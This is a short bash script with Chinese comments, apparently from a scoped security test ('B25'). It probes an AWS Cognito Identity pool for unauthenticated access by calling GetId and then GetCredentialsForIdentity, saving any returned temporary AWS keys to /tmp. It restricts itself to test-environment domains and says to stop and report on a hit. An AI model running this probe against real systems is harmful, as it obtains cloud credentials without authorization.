#!/usr/bin/env bash
# B25：Cognito Identity 池未认证凭证快查（仅测试环境）
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
# shellcheck disable=SC1091
source "$ROOT/testenv.env"

die() { echo "ERR: $*" >&2; exit 1; }
[[ -f "$ROOT/testenv.env" ]] || die "先复制 testenv.env.example 为 testenv.env 并填写"
[[ -n "${AUTH_DESKTOP:-}" && -n "${IDENTITY_POOL_ID:-}" ]] || die "填 AUTH_DESKTOP 和 IDENTITY_POOL_ID"
echo "$AUTH_DESKTOP" | grep -Eq 'beta|gamma|test' || die "AUTH_DESKTOP 必须是测试环境域名"

echo "== GetId（不带头） =="
curl -sS -X POST "$AUTH_DESKTOP/" \
  -H 'Content-Type: application/x-amz-json-1.1' \
  -H 'X-Amz-Target: AWSCognitoIdentityService.GetId' \
  -d "{\"IdentityPoolId\":\"$IDENTITY_POOL_ID\"${AWS_ACCOUNT_ID:+,\"AccountId\":\"$AWS_ACCOUNT_ID\"}}" \
  | tee /tmp/b25_getid.json
echo

ID=$(python3 -c "import json; d=json.load(open('/tmp/b25_getid.json')); print(d.get('IdentityId',''))" 2>/dev/null || true)
if [[ -z "$ID" ]]; then
  echo "未返回 IdentityId → 未认证身份关闭（B25 未中）。记下完整响应。"
  exit 0
fi

echo "== GetCredentialsForIdentity IdentityId=$ID =="
curl -sS -X POST "$AUTH_DESKTOP/" \
  -H 'Content-Type: application/x-amz-json-1.1' \
  -H 'X-Amz-Target: AWSCognitoIdentityService.GetCredentialsForIdentity' \
  -d "{\"IdentityId\":\"$ID\"}" \
  | tee /tmp/b25_creds.json
echo
echo "若返回 AccessKeyId/SecretKey/SessionToken → B25 命中。立刻 sts:GetCallerIdentity 看角色，然后停手上报。"
